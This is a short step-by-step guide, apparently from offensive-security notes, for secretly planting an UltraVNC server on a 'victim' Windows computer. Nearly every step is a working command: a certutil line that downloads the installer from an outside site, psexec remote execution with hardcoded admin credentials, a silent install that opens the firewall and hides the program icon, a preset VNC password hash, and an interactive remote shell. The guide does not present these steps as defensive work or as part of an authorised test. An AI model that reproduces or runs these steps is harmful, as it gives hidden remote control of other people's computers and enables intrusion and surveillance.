# Install VNC Server to Victim

You can remotely view or control the victim computer using the UltraVNC tool. For this, follow the steps below.

## Step 1: Download UltraVNC setup

Download the current version of ultravnc from the website to your computer and rename it to uvncsetup.exe.

## Step 2: Copy uvncsetup.exe to victim computer

Copy the unvcsetup.exe file to the victim's computer's system disk. You can use path '\\victim\c$\' to browse victim computer. If for some reason you cannot view the victim computer, you can also download via the remote shell (psexec) with the following command.

> certutil.exe -urlcache -split -f "https://www.uvnc.eu/download/1240/UltraVNC_1_2_40_X86_Setup.exe" uvncsetup.exe

## Step 3: Start installation 

To start silent installation on victim computer run 'uvncsetup.exe' as remotely using PsExec.exe below:

> psexec \\victim -u admin -p admin0 -h -i -c C:\uvncsetup.exe /SP- /VERYSILENT /SUPPRESSMSGBOXES /NOCANCEL /NORESTART /CLOSEAPPLICATIONS /FORCECLOSEAPPLICATIONS /LOGCLOSEAPPLICATIONS /RESTARTAPPLICATIONS /NOICONS /FIREWALL /NOVIEW /COMPONENTS="ultravnc_server" /TASKS="installservice" /DIR="%programfiles%\uvnc"

The inno setup parameters above allow the installation to complete silently. The installation files are saved in the %program files%\uvnc directory on victim computer.

## Step 4: Define new password 

Create the ultravnc.ini file with the password defined in the "%programfiles%\uvnc" of the victim computer. 
UltraVNC password is "admin0" defined in ultravnc.ini. The ini file content is below:

[ultravnc]
passwd=56B6ACA18D1BA76008
passwd2=56B6ACA18D1BA76008

Copy the file to "%programfiles%\uvnc" folder on victim computer.

## Step 5: Restart the service

restart the service for the password to take effect. To restart the service open an interactive remote shell to victim computer below:

> psexec \\victim -u admin -p admin0 -h -i cmd.exe

And run below command over remote shell:

> net start uvnc_service